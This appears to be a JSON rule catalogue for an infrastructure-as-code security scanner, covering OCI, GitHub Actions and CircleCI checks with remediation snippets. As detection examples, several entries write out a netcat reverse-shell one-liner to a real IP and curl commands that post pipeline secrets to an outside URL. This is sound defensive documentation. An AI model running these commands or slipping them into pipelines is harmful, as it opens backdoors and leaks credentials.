        "description": "OCI Compute Instance has monitoring disabled\nDescription\nThis policy identifies the OCI Compute Instances that are configured with Monitoring disabled. It is recommended that Compute Instances should be configured with monitoring is enabled following security best practices.\nFix - Runtime\nOCI Console\n\nLogin to the OCI Console\nType the resource reported in the alert into the Search box at the top of the Console.\nClick the resource reported in the alert from the Resources submenu\nUnder Resources, click Metrics.\nClick Enable monitoring. (If monitoring is not enabled (and the instance uses a supported image), then a button is available to enable monitoring.)\n\nFMI : https://docs.cloud.oracle.com/en-us/iaas/Content/Compute/Tasks/enablingmonitoring.htm#ExistingEnabling\nFix - Buildtime\nTerraform\n\nResource: oci_core_instance\nArguments: agent_config.is_monitoring_disabled \n\nGoresource \"oci_core_instance\" \"pass\" {\n  ...\n  agent_config {\n    ...\n    is_monitoring_disabled   = false\n   ....\n}\n",
        "severity": "HIGH"
    },
    "CKV_OCI_7": {
        "url": "https://docs.bridgecrew.io/docs/ensure-oci-object-storage-bucket-can-emit-object-events",
        "description": "OCI Object Storage bucket does not emit object events\nDescription\nThis policy identifies the OCI Object Storage buckets that are disabled with object events emission. Monitoring and alerting on object events of bucket objects will help in identifying changes bucket objects. It is recommended that buckets should be enabled to emit object events.\nFix - Runtime\nOCI Console\n\nLogin to the OCI Console\nType the resource reported in the alert into the Search box at the top of the Console.\nClick the resource reported in the alert from the Resources submenu\nNext to Emit Object Events, click Edit.\nIn the dialog box, select  EMIT OBJECT EVENTS (to enable).\nClick Save Changes.\n\nFix - Buildtime\nTerraform\n\nResource: oci_objectstorage_bucket\nArguments: agent_config.is_monitoring_disabled \n\nGoresource \"oci_objectstorage_bucket\" \"pass\" {\n  ...\n  object_events_enabled = true\n...\n}\n",
        "severity": "HIGH"
    },
    "CKV_OCI_8": {
        "url": "https://docs.bridgecrew.io/docs/ensure-oci-object-storage-has-versioning-enabled",
        "description": "OCI Object Storage Bucket has object Versioning disabled\nDescription\nThis policy identifies the OCI Object Storage buckets that are not configured with a Object Versioning. It is recommended that Object Storage buckets should be configured with Object Versioning to minimize data loss because of inadvertent deletes by an authorized user or malicious deletes.\nFix - Runtime\nOCI Console\n\nLogin to the OCI Console\nType the resource reported in the alert into the Search box at the top of the Console.\nClick the resource reported in the alert from the Resources submenu\nNext to Object Versioning, click Edit.\nIn the dialog box, Clink Enable Versioing (to enable).\n\nFix - Buildtime\nTerraform\n\nResource: oci_objectstorage_bucket\nArguments: versioning\n\nGoresource \"oci_objectstorage_bucket\" \"pass\" {\n  ...\n\n  versioning = \"Enabled\"\n}\n",
        "severity": "HIGH"
    },
    "CKV_OCI_11": {
        "url": "https://docs.bridgecrew.io/docs/oci-iam-password-policy-must-contain-lower-case",
        "description": "OCI IAM password policy for local (non-federated) users does not have a lowercase character\nDescription\nThis policy identifies Oracle Cloud Infrastructure(OCI) accounts that do not have a lowercase character in the password policy for local (non-federated) users. As a security best practice, configure a strong password policy for secure access to the OCI console.\nFix - Runtime\nOCI Console\n\nLogin to the OCI Console Page: https://console.ap-mumbai-1.oraclecloud.com/\nGo to Identity in the Services menu.\nSelect Authentication Settings from the Identity menu.\n4.Click Edit Authentication Settings in the middle of the page.\n5.Ensure the checkbox is selected next to MUST CONTAIN AT LEAST 1 LOWERCASE CHARACTER.\nNote : The console URL is region specific, your tenancy might have a different home region and thus console URL.\n\nFix - Buildtime\nTerraform\n\nResource: oci_identity_authentication_policy\nArguments: password_policy.is_lowercase_characters_required\n\nGoresource \"oci_identity_authentication_policy\" \"pass\" {\n...\n\n  password_policy {\n    is_lowercase_characters_required = true\n...\n  }\n}\n",
        "severity": "HIGH"
    },
    "CKV_OCI_13": {
        "url": "https://docs.bridgecrew.io/docs/oci-iam-password-policy-must-contain-special-characters",
        "description": "OCI IAM password policy for local (non-federated) users does not have a symbol\nDescription\nThis policy identifies Oracle Cloud Infrastructure(OCI) accounts that do not have a symbol in the password policy for local (non-federated) users. As a security best practice, configure a strong password policy for secure access to the OCI console.\nFix - Runtime\nOCI Console\n\nLogin to the OCI Console Page: https://console.ap-mumbai-1.oraclecloud.com/\nGo to Identity in the Services menu.\nSelect Authentication Settings from the Identity menu.\nClick Edit Authentication Settings in the middle of the page.\nEnsure the checkbox is selected next to MUST CONTAIN AT LEAST 1 SPECIAL CHARACTER.\n\nNote : The console URL is region specific, your tenancy might have a different home region and thus console URL.\nFix - Buildtime\nTerraform\n\nResource: oci_identity_authentication_policy\nArguments:  password_policy.is_special_characters_required\n\nGoresource \"oci_identity_authentication_policy\" \"pass\" {\n\n  compartment_id = var.tenancy_id\n\n  password_policy {\n    ...\n    is_special_characters_required   = true\n    ...\n  }\n}\n",
        "severity": "HIGH"
    },
    "CKV_OCI_17": {
        "url": "https://docs.bridgecrew.io/docs/ensure-vcn-inbound-security-lists-are-stateless",
        "description": "OCI VCN Security list has stateful security rules\nDescription\nThis policy identifies the OCI Virtual Cloud Networks (VCN) security lists that have stateful ingress rules configured in their security lists. It is recommended that Virtual Cloud Networks (VCN) security lists are configured with stateless ingress rules to slow the impact of a denial-of-service (DoS) attack.\nFix - Runtime\nOCI Console\n\nLogin to the OCI Console\nType the resource reported in the alert into the Search box at the top of the Console.\nClick the resource reported in the alert from the Resources submenu\nClick on Ingress rule where Stateless column is set to No\nClick on Edit\nSelect the checkbox STATELESS\nClick on Save Changes\n\nFix - Buildtime\nTerraform\n\nResource: oci_core_security_list\nArguments: vcn_id + ingress_security_rule\n\nGoresource \"oci_core_security_list\" \"pass\" {\n    compartment_id = oci_identity_compartment.tf-compartment.id\n    vcn_id = oci_core_vcn.test_vcn.id\n    ingress_security_rules {\n        protocol = \"all\"\n        source=\"192.168.1.0/24\"\n    }\n}\n",
        "severity": "HIGH"
    },
    "CKV_OCI_3": {
        "url": "https://docs.bridgecrew.io/docs/oci-block-storage-block-volumes-are-not-encrypted-with-a-customer-managed-key-cmk",
        "description": "OCI Block Storage Block Volumes are not encrypted with a Customer Managed Key(CMK)\nDescription\nThis policy identifies the OCI Block Storage Volumes that are not encrypted with a Customer Managed Key (CMK). It is recommended that Block Storage Volumes should be encrypted with a Customer Managed Key (CMK), using  Customer Managed Key (CMK), provides an additional level of security on your data by allowing you to manage your own encryption key lifecycle management for the Block Storage Volume.\nFix - Runtime\nOCI Console\n\nLogin to the OCI Console\nType the resource reported in the alert into the Search box at the top of the Console.\nClick the resource reported in the alert from the Resources submenu\nClick Assign next to Encryption Key: Oracle managed key.\nSelect a Vault from the appropriate compartment\nSelect a Master Encryption Key\nClick Assign\n\nFix - Buildtime\nTerraform\n\nResource: oci_core_volum\nArguments: kms_key_id\n\nGoresource \"oci_core_volume\" \"pass\" {\n  #Required\n  compartment_id = var.compartment_id\n  availability_domain = var.volume_block_volume_replicas_availability_domain\n\n  }\n  defined_tags         = { \"Operations.CostCenter\" = \"42\" }\n  display_name         = var.volume_display_name\n  freeform_tags        = { \"Department\" = \"Finance\" }\n  is_auto_tune_enabled = var.volume_is_auto_tune_enabled\n  kms_key_id           = oci_kms_key.test_key.id\n  size_in_gbs          = var.volume_size_in_gbs\n  size_in_mbs          = var.volume_size_in_mbs\n  source_details {\n    #Required\n    id   = var.volume_source_details_id\n    type = var.volume_source_details_type\n  }\n}\n",
        "severity": "HIGH"
    },
    "CKV_OCI_4": {
        "url": "https://docs.bridgecrew.io/docs/ensure-oci-compute-instance-boot-volume-has-in-transit-data-encryption-enabled",
        "description": "OCI Compute Instance boot volume has in-transit data encryption is disabled\nDescription\nThis policy identifies the OCI Compute Instances that are configured with disabled in-transit data encryption boot or block volumes. It is recommended that Compute Instance boot or block volumes should be configured with in-transit data encryption to minimize risk for sensitive data being leaked.\nFix - Runtime\nOCI Console\n\nLogin to the OCI Console\nType the resource reported in the alert into the Search box at the top of the Console.\nClick the resource reported in the alert from the Resources submenu\nClick Edit\nClick on Show Advanced Options\nSelect USE IN-TRANSIT ENCRYPTION\nClick Save Changes\nNote : To update the instance properties, the instance must be rebooted.\n\nFix - Buildtime\nTerraform\n\nResource: oci_core_instance\nArguments: is_pv_encryption_in_transit_enabled\n\nGoresource \"oci_core_instance\" \"pass\" {\n...\n \n  }\n  ipxe_script                         = var.instance_ipxe_script\n  is_pv_encryption_in_transit_enabled = var.instance_is_pv_encryption_in_transit_enabled\n\n  launch_options {\n    boot_volume_type                    = var.instance_launch_options_boot_volume_type\n    firmware                            = var.instance_launch_options_firmware\n    is_consistent_volume_naming_enabled = var.instance_launch_options_is_consistent_volume_naming_enabled\n    is_pv_encryption_in_transit_enabled = true\n    network_type                        = var.instance_launch_options_network_type\n    remote_data_volume_type             = var.instance_launch_options_remote_data_volume_type\n  }\n...\n}\n",
        "severity": "HIGH"
    },
    "CKV_OCI_5": {
        "url": "https://docs.bridgecrew.io/docs/ensure-oci-compute-instance-has-legacy-metadata-service-endpoint-disabled",
        "description": "OCI Compute Instance has Legacy MetaData service endpoint enabled\nDescription\nThis policy identifies the OCI Compute Instances that are configured with Legacy MetaData service (IMDSv1) endpoints enabled. It is recommended that Compute Instances should be configured with legacy v1 endpoints (Instance Metadata Service v1) being disabled, and use Instance Metadata Service v2 instead following security best practices.\nFix - Runtime\nOCI Console\n\nLogin to the OCI Console\nType the resource reported in the alert into the Search box at the top of the Console.\nClick the resource reported in the alert from the Resources submenu\nIn the Instance Details section, next to Instance Metadata Service, click Edit.\nFor the Allowed IMDS version, select the Version 2 only option.\nClick Save Changes.\nNote :\nIf you disable IMDSv1 on an instance that does not support IMDSv2, you might not be able to connect to the instance when you launch it. To re enable IMDSv1: using the Console, on the Instance Details page, next to Instance Metadata Service, click Edit. Select the Version 1 and version 2 option, save your changes, and then restart the instance. Using the API, use the UpdateInstance operation.\nFMI : https://docs.cloud.oracle.com/en-us/iaas/Content/Compute/Tasks/gettingmetadata.htm#upgrading-v2\n\nFix - Buildtime\nTerraform\n\nResource: oci_core_instance\nArguments: instance_options.are_legacy_imds_endpoints_disabled\n\nGoresource \"oci_core_instance\" \"pass\" {\n...\n  instance_options {\n    are_legacy_imds_endpoints_disabled = true\n  }\n...\n}\n",
        "severity": "HIGH"
    },
    "CKV_OCI_9": {
        "url": "https://docs.bridgecrew.io/docs/ensure-oci-object-storage-is-encrypted-with-customer-managed-key",
        "description": "OCI Object Storage Bucket is not encrypted with a Customer Managed Key (CMK)\nDescription\nThis policy identifies the OCI Object Storage buckets that are not encrypted with a Customer Managed Key (CMK). It is recommended that Object Storage buckets should be encrypted with a Customer Managed Key (CMK), using  Customer Managed Key (CMK), provides an additional level of security on your data by allowing you to manage your own encryption key lifecycle management for the bucket.\nFix - Runtime\nOCI Console\n\nLogin to the OCI Console\nType the resource reported in the alert into the Search box at the top of the Console.\nClick the resource reported in the alert from the Resources submenu\nClick Assign next to Encryption Key: Oracle managed key.\nSelect a Vault from the appropriate compartment\nSelect a Master Encryption Key\nClick Assign\n\nFix - Buildtime\nTerraform\n\nResource: oci_objectstorage_bucke\nArguments: kms_key_id \n\nGoresource \"oci_objectstorage_bucket\" \"pass\" {\n  ...\n  kms_key_id            = var.oci_kms_key.id\n  ...\n}\n",
        "severity": "HIGH"
    },
    "CKV_OCI_10": {
        "url": "https://docs.bridgecrew.io/docs/ensure-oci-object-storage-is-not-public",
        "description": "OCI Object Storage bucket is publicly accessible\nDescription\nThis policy identifies the OCI Object Storage buckets that are publicly accessible. Monitoring and alerting on publicly accessible buckets will help in identifying changes to the security posture and thus reduces risk for sensitive data being leaked. It is recommended that no bucket be publicly accessible.\nFix - Runtime\nOCI Console\n\nLogin to the OCI Console\nType the resource reported in the alert into the Search box at the top of the Console.\nClick the resource reported in the alert from the Resources submenu\nClick on the Edit Visibility\nSelect Visibility as Private\nClick Save Changes\n\nFix - Buildtime\nTerraform\n\nResource: oci_objectstorage_bucket\nArguments: access_type\n\nGoresource \"oci_objectstorage_bucket\" \"pass2\" {\n...\n  access_type           = \"NoPublicAccess\"\n...\n}\n",
        "severity": "HIGH"
    },
    "CKV_OCI_12": {
        "url": "https://docs.bridgecrew.io/docs/oci-iam-password-policy-must-contain-numeric-characters",
        "description": "OCI IAM password policy for local (non-federated) users does not have a number\nDescription\nThis policy identifies Oracle Cloud Infrastructure(OCI) accounts that do not have a lowercase character in the password policy for local (non-federated) users. As a security best practice, configure a strong password policy for secure access to the OCI console.\nFix - Runtime\nOCI Console\n\nLogin to the OCI Console Page: https://console.ap-mumbai-1.oraclecloud.com/\nGo to Identity in the Services menu.\nSelect Authentication Settings from the Identity menu.\n4.Click Edit Authentication Settings in the middle of the page.\n5.Ensure the checkbox is selected next to MUST CONTAIN AT LEAST 1 LOWERCASE CHARACTER.\nNote : The console URL is region specific, your tenancy might have a different home region and thus console URL.\n\nFix - Buildtime\nTerraform\n\nResource: oci_identity_authentication_policy\nArguments: password_policy.is_numeric_characters_required\n\nGoresource \"oci_identity_authentication_policy\" \"pass\" {\n...\n  password_policy {\n    ...\n    is_numeric_characters_required   = true\n    ...\n  }\n}\n",
        "severity": "HIGH"
    },
    "CKV_OCI_14": {
        "url": "https://docs.bridgecrew.io/docs/oci-iam-password-policy-must-contain-uppercase-characters",
        "description": "OCI IAM password policy for local (non-federated) users does not have an uppercase character\nDescription\nThis policy identifies Oracle Cloud Infrastructure(OCI) accounts that do not have an uppercase character in the password policy for local (non-federated) users. As a security best practice, configure a strong password policy for secure access to the OCI console.\nFix - Runtime\nOCI Console\n\nLogin to the OCI Console Page:https://console.ap-mumbai-1.oraclecloud.com/\nGo to Identity in the Services menu.\nSelect Authentication Settings from the Identity menu.\nClick Edit Authentication Settings in the middle of the page.\nEnsure the checkbox is selected next to MUST CONTAIN AT LEAST 1 UPPERCASE CHARACTER.\n\nNote : The console URL is region specific, your tenancy might have a different home region and thus console URL.\nFix - Buildtime\nTerraform\n\nResource: oci_identity_authentication_policy\nArguments: password_policy.is_uppercase_characters_required\n\nGoresource \"oci_identity_authentication_policy\" \"pass\" {\n...\n  password_policy {\n    ...\n    is_uppercase_characters_required = true\n    ...\n  }\n}\n",
        "severity": "HIGH"
    },
    "CKV_OCI_15": {
        "url": "https://docs.bridgecrew.io/docs/ensure-oci-file-system-is-encrypted-with-a-customer-managed-key",
        "description": "OCI File Storage File Systems are not encrypted with a Customer Managed Key (CMK)\nDescription\nThis policy identifies the OCI File Storage File Systems that are not encrypted with a Customer Managed Key (CMK). It is recommended that File Storage File Systems should be encrypted with a Customer Managed Key (CMK), using  Customer Managed Key (CMK), provides an additional level of security on your data by allowing you to manage your own encryption key lifecycle management for the File System\nFix - Runtime\nOCI Console\n\nLogin to the OCI Console\nType the resource reported in the alert into the Search box at the top of the Console.\nClick the resource reported in the alert from the Resources submenu\nClick Assign next to Encryption Key: Oracle managed key.\nSelect a Vault from the appropriate compartment\nSelect a Master Encryption Key\nClick Assign\n\nFix - Buildtime\nTerraform\n\nResource: oci_file_storage_file_system\nArguments: kms_key_id\n\nGoresource \"oci_file_storage_file_system\" \"pass\" {\n  ...\n  kms_key_id         = oci_kms_key.test_key.id\n  ...\n}\n",
        "severity": "HIGH"
    },
    "CKV_OCI_16": {
        "url": "https://docs.bridgecrew.io/docs/ensure-vcn-has-an-inbound-security-list",
        "description": "OCI VCN has no inbound security list\nDescription\nThis policy identifies the OCI Virtual Cloud Networks (VCN) that lack ingress rules configured in their security lists. It is recommended that Virtual Cloud Networks (VCN) security lists are configured with ingress rules which provide stateful and stateless firewall capability to control network access to your instances.\nFix - Runtime\nOCI Console\n\nLogin to the OCI Console\nType the resource reported in the alert into the Search box at the top of the Console.\nClick the resource reported in the alert from the Resources submenu\nClick on Ingress rules\nClick on Add Ingress Rules (To add ingress rules appropriately in the pop up)\nClick on Add Ingress Rules\n\nFix - Buildtime\nTerraform\n\nResource: oci_core_security_list\nArguments: vcn_id + ingress_security_rules\n\nGoresource \"oci_core_security_list\" \"pass\" {\n    compartment_id = oci_identity_compartment.tf-compartment.id\n    vcn_id = oci_core_vcn.test_vcn.id\n    ingress_security_rules {\n        protocol = \"all\"\n        source=\"192.168.1.0/24\"\n    }\n}\n",
        "severity": "HIGH"
    },
    "CKV_OCI_19": {
        "url": "https://docs.bridgecrew.io/docs/ensure-oci-security-list-does-not-allow-ingress-from-00000-to-port-22",
        "description": "OCI Secrity Lists with Unrestricted traffic to port 22\nDescription\nSecurity list are stateful and provide filtering of ingress/egress network traffic to OCI resources. We recommend that security groups do not allow unrestricted ingress access to port 22. Removing unfettered connectivity to remote console services, such as SSH, reduces a server's exposure to risk.\nFix - Runtime\nFix - Buildtime\nTerraform\nGoresource \"oci_core_security_list\" \"pass0\" {\n    compartment_id = \"var.compartment_id\"\n    vcn_id = \"oci_core_vcn.test_vcn.id\"\n\n    ingress_security_rules {\n        protocol = \"var.security_list_ingress_security_rules_protocol\"\n        source = \"0.0.0.0/0\"\n\n        tcp_options {\n            max = 25\n            min = 25\n            source_port_range {\n                max = \"var.security_list_ingress_security_rules_tcp_options_source_port_range_max\"\n                min = \"var.security_list_ingress_security_rules_tcp_options_source_port_range_min\"\n            }\n        }\n        udp_options {\n            max = 21\n            min = 20\n            source_port_range {\n                max = \"var.security_list_ingress_security_rules_udp_options_source_port_range_max\"\n                min = \"var.security_list_ingress_security_rules_udp_options_source_port_range_min\"\n            }\n        }\n    }\n}\n",
        "severity": "LOW"
    },
    "CKV_OCI_20": {
        "url": "https://docs.bridgecrew.io/docs/ensure-oci-security-list-does-not-allow-ingress-from-00000-to-port-3389",
        "description": "OCI security lists allows unrestricted ingress access to port 3389\nDescription\nThis policy identifies Security list that allow inbound traffic on RDP port (3389) from the public internet. As a best practice, restrict security groups to only allow permitted traffic and limit brute force attacks on your network.\nFix - Runtime\nFix - Buildtime\nTerraform\nGoresource \"oci_core_security_list\" \"pass0\" {\n    compartment_id = \"var.compartment_id\"\n    vcn_id = \"oci_core_vcn.test_vcn.id\"\n\n    ingress_security_rules {\n        protocol = \"var.security_list_ingress_security_rules_protocol\"\n        source = \"0.0.0.0/0\"\n\n        tcp_options {\n            max = 4000\n            min = 3390\n            source_port_range {\n                max = \"var.security_list_ingress_security_rules_tcp_options_source_port_range_max\"\n                min = \"var.security_list_ingress_security_rules_tcp_options_source_port_range_min\"\n            }\n        }\n        udp_options {\n            max = 21\n            min = 20\n            source_port_range {\n                max = \"var.security_list_ingress_security_rules_udp_options_source_port_range_max\"\n                min = \"var.security_list_ingress_security_rules_udp_options_source_port_range_min\"\n            }\n        }\n    }\n}\n",
        "severity": "LOW"
    },
    "CKV_OCI_22": {
        "url": "https://docs.bridgecrew.io/docs/ensure-oci-security-groups-rules-do-not-allow-ingress-from-00000-to-port-22",
        "description": "OCI security group allows unrestricted ingress access to port 22\nDescription\nSecurity groups are stateful and provide filtering of ingress/egress network traffic to OCI resources. We recommend that security groups do not allow unrestricted ingress access to port 22. Removing unfettered connectivity to remote console services, such as SSH, reduces a server's exposure to risk.\nFix - Runtime\nFix - Buildtime\nTerraform\nGoresource \"oci_core_network_security_group_security_rule\" \"pass\" {\n    network_security_group_id = oci_core_network_security_group.sg.id\n    direction = \"EGRESS\"\n    protocol = \"all\"\n    source = \"0.0.0.0/0\"\n\n    tcp_options {\n        destination_port_range {\n            max = 22\n            min = 22\n        }\n    }\n}\n",
        "severity": "LOW"
    },
    "CKV_OCI_21": {
        "url": "https://docs.bridgecrew.io/docs/ensure-oci-security-group-has-stateless-ingress-security-rules",
        "description": "OCI Network Security Groups (NSG) has stateful security rules\nDescription\nStateless rules for network security groups create one way traffic rather than two. This makes it very explicit which ports are available internally and externally. This is recommended for high volume websites.\nFix - Runtime\n\nGo to Networking > Virtual Cloud Networks > VCN Name > Resources > Network Security Groups\nEdit your Network Security Group\nUnder Security Rules, Rules, check \"Stateless\" for all rules\n\nFix - Buildtime\n\nResource: oci_core_network_security_group_security_rule\nArguments: stateless\n\nGoresource \"oci_core_network_security_group_security_rule\" \"pass\" {\n  network_security_group_id = oci_core_network_security_group.test_network_security_group.id\n  direction                 = \"INGRESS\"\n  protocol                  = var.network_security_group_security_rule_protocol\n+  stateless                 = true\n}\n",
        "severity": "LOW"
    },
    "CKV_GHA_1": {
        "url": "https://docs.bridgecrew.io/docs/ensure-actions_allow_unsecure_commands-isnt-true-on-environment-variables",
        "description": "GitHub Actions ACTIONS_ALLOW_UNSECURE_COMMANDS environment variable is set to true\nDescription\nGitHub Actions has an environment variable flag called ACTIONS_ALLOW_UNSECURE_COMMANDS that allows GHA workflows to run deprecated commands set-env and add-path. These are vulnerable commands that should not be used as they expose accounts to potential credential theft or code injection.\nFix - Buildtime\nGitHub Actions\nRemove ACTIONS_ALLOW_UNSECURE_COMMANDS: 'true'\nYAML...\n         env:\n-          ACTIONS_ALLOW_UNSECURE_COMMANDS: 'true'\n...\n",
        "severity": "MEDIUM"
    },
    "CKV_GHA_2": {
        "url": "https://docs.bridgecrew.io/docs/ensure-run-commands-are-not-vulnerable-to-shell-injection",
        "description": "GitHub Actions Run commands are vulnerable to shell injection\nBlock potentially risky references to variables that are controlled by third parties. You should avoid any API calls that include processing these as input. Source\nPotentially risky variables include:\n\ngithub.event.issue.title\ngithub.event.issue.body\ngithub.event.pull_request.title\ngithub.event.pull_request.body\ngithub.event.comment.body\ngithub.event.review.body\ngithub.event.review_comment.body\ngithub.event.pages.*.page_name\ngithub.event.commits.*.message\ngithub.event.head_commit.message\ngithub.event.head_commit.author.email\ngithub.event.head_commit.author.name\ngithub.event.commits.*.author.email\ngithub.event.commits.*.author.name\ngithub.event.pull_request.head.ref\ngithub.event.pull_request.head.label\ngithub.event.pull_request.head.repo.default_branch\ngithub.head_ref\n\nFix - Buildtime\nGitHub Actions yaml\nYAML-          title=\"${{ github.event.issue.title }}\"\n",
        "severity": "MEDIUM"
    },
    "CKV_GHA_3": {
        "url": "https://docs.bridgecrew.io/docs/suspicious-use-of-curl-with-secrets",
        "description": "GitHub Actions curl is being with secrets\nIf a secret is able to be obtained in a workflow and a bad actor can modify the GitHub Action, they can send the secret to a website they own via curl.\nFix - Buildtime\nGitHub Actions\nBlock code and remove code that attempts to exfiltrate secrets.\nYAML       run:  |\n-         echo \"${{ toJSON(secrets) }}\" > .secrets\n-         curl -X POST -s --data \"@.secrets\" <BADURL > /dev/null\n",
        "severity": "LOW"
    },
    "CKV_GHA_4": {
        "url": "https://docs.bridgecrew.io/docs/suspicious-use-of-netcat-with-ip-address",
        "description": "GitHub Actions Netcat is being used with IP address\nNetcat in combination with an IP address can be used to establish a connection to an external computer or server. This can be used to open up backdoor access or exfiltrate data.\nFix - Buildtime\nGitHub Actions\nBlock code and remove code that attempts to make a connection over a network.\nYAML-         rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|netcat 34.159.16.75 32032 >/tmp/f\n",
        "severity": "LOW"
    },
    "CKV_GHA_5": {
        "url": "https://docs.bridgecrew.io/docs/no-evidence-of-signing",
        "description": "GitHub Actions artifact build do not have cosign - sign execution in pipeline\nCosign can be used to sign pipeline artifacts, such as container images, to ensure their integrity and prevent tampering prior to and after deployment. Violating this policy means a signable artifact was discovered but there is no evidence of signing that artifact in your pipeline.\nExample Fix\nAdd cosign sign to sign artifacts. There are many ways to do this as a job or step in a GitHub Actions pipeline. Below is one example for signing a container image.\nYAML+ run: cosign sign --key env://COSIGN_PRIVATE_KEY -a sha=${{ github.sha }} -a run_id=${{ github.run_id }} ${{ env.IMAGE }}\n",
        "severity": "LOW"
    },
    "CKV_GHA_6": {
        "url": "https://docs.bridgecrew.io/docs/found-artifact-build-without-evidence-of-cosign-sbom-attestation-in-pipeline",
        "description": "GitHub Actions artifact build do not have SBOM attestation in pipeline\nCosign can be used to sign pipeline artifacts to ensure their integrity and prevent tampering prior to and after deployment. Signing SBOMs ensures that no changes were made to an application between the code and deploy phases.\nExample Fix\nAdd cosign sign to sign SBOMs. There are many ways to do this as a job or step in a GitHub Actions pipeline. Below is one example for signing an SBOM.\nYAML+ run: cosign attest --predicate sbom.json --type https://cyclonedx.org/bom --key env://COSIGN_PRIVATE_KEY ${{ env.IMAGE }}\n\nOR\nYAML+ run: cosign sign --key cosign.key container:sha256-1234.sbom\n",
        "severity": "LOW"
    },
    "CKV_GHA_7": {
        "url": "https://docs.bridgecrew.io/docs/the-build-output-cannot-be-affected-by-user-parameters-other-than-the-build-entry-point-and-the-top-level-source-location-github-actions-workflow_dispatch-inputs-must-be-empty",
        "description": "GitHub Actions contain workflow_dispatch inputs parameters\nTo maintain an untampered workflow, pipelines should be unaffected by user input. In GitHub Actions, workflow_dispatch allows you to manually trigger pipelines and enter unique inputs per run. While this may be helpful for running different scenarios, it breaks the policy that workflows should not use user input and should be automated.\nExample Fix\nYAMLon: \n  workflow_dispatch:\n-    inputs:\n-        ...\n",
        "severity": "LOW"
    },
    "CKV_CIRCLECIPIPELINES_1": {
        "url": "https://docs.bridgecrew.io/docs/ensure-the-pipeline-image-uses-a-non-latest-version-tag",
        "description": "Ensure the containers used in your pipelines have a defined version or a digest.\n-  image: ubuntu\n+  image: [email\u00a0protected]:817cfe4672284dcbfee885b1a66094fd907630d610cab329114d036716be49ba\n",
        "severity": "LOW"
    },
    "CKV_CIRCLECIPIPELINES_2": {
        "url": "https://docs.bridgecrew.io/docs/ensure-the-pipeline-image-version-is-referenced-via-hash-not-arbitrary-tag",
        "description": "Ensure the containers used in your pipelines have a defined version or a digest.\n-  image: ubuntu\n+  image: ubuntu: jammy-20221101\n",
        "severity": "LOW"
    },
    "CKV_CIRCLECIPIPELINES_3": {
        "url": "https://docs.bridgecrew.io/docs/ensure-mutable-development-orbs-are-not-used",
        "description": "Development orbs are temporary mutable orb tag versions used for testing. Since they are mutable and development by nature they are not specific enough and should not be used in a production pipeline.\n- example/[email\u00a0protected]:my-feature-branch\n+ example/[email\u00a0protected]\n",
        "severity": "MEDIUM"
    },
    "CKV_CIRCLECIPIPELINES_4": {
        "url": "https://docs.bridgecrew.io/docs/ensure-unversioned-volatile-orbs-are-not-used",
        "description": "Using the volatile tag retrieves the latest release even if it is not yet versioned. These can be unstable development orbs and they are mutable and thus susceptible to abuse. Make sure to use a semver versioned orb.\n- biz/[email\u00a0protected]\n+ biz/[email\u00a0protected]\n",
        "severity": "MEDIUM"
    },
    "CKV_CIRCLECIPIPELINES_5": {
        "url": "https://docs.bridgecrew.io/docs/suspicious-use-of-netcat-with-ip-address-1",
        "description": "Ensure there are no suspicious uses of netcat with IP address\nDescription\nNetcat in combination with an IP address can be used to establish a connection to an external computer or server. This can be used to open up backdoor access or exfiltrate data.\nExample Fix\nBlock code and remove code that attempts to make a connection over a network.\nYAML-         rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|netcat 34.159.16.75 32032 >/tmp/f\n",
        "severity": "LOW"
    },
    "CKV_CIRCLECIPIPELINES_6": {
        "url": "https://docs.bridgecrew.io/docs/ensure-run-commands-are-not-vulnerable-to-shell-injection-1",
        "description": "The use of certain commands in conjunction with key variables can lead to data exfiltration and exposure.\n  run: \n    command:\n-      echo ${CIRCLE_PR_REPONAME}\n",
        "severity": "LOW"
    },
    "CKV_CIRCLECIPIPELINES_7": {
        "url": "https://docs.bridgecrew.io/docs/suspicious-use-of-curl-in-run-task",
        "description": "Ensure no suspicious use of curl in run task\nDescription\nCurl with key variables can be used in pipelines to exfiltrate secrets and data if added to a pipeline.\n  - run:\n       command: |\n-          curl -x POST someurl $SECRET\n",
        "severity": "LOW"
    }
}
